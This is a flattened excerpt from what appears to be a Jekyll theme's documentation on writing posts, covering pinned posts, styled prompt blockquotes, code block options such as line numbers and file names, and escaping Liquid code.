PostsYou can pin one or more posts to the top of the home page, and the fixed posts are sorted in reverse order according to their release date. Enable by:---pin: true---PromptsThere are several types of prompts: tip, info, warning, and danger. They can be generated by adding the class prompt-{type} to the blockquote. For example, define a prompt of type info as follows:&gt; Example line for prompt.{: .prompt-info }SyntaxInline Code`inline code part`Filepath Hightlight`/path/to/a/file.extend`{: .filepath}Code BlockMarkdown symbols ``` can easily create a code block as follows:```This is a plaintext code snippet.```Specifying LanguageUsing ```{language} you will get a code block with syntax highlight:```yamlkey: value```  The Jekyll tag {% highlight %} is not compatible with this theme.Line NumberBy default, all languages except plaintext, console, and terminal will display line numbers. When you want to hide the line number of a code block, add the class nolineno to it:```shellecho 'No more line numbers!'```{: .nolineno }Specifying the FilenameYou may have noticed that the code language will be displayed at the top of the code block. If you want to replace it with the file name, you can add the attribute file to achieve this:```shell# content```{: file=\"path/to/file\" }Liquid CodesIf you want to display the Liquid snippet, surround the liquid code with {% raw %} and {% endraw %}:{% raw %}```liquid{% if product.title contains 'Pack' %}  This product's title contains the word Pack.{% endif %}```{% endraw %}Or adding render_with_liquid: false (Requires Jekyll 4.0 or higher) to the post’s YAML block.Learn MoreFor more knowledge about Jekyll posts, visit the Jekyll Docs: Posts."
  }
  
]

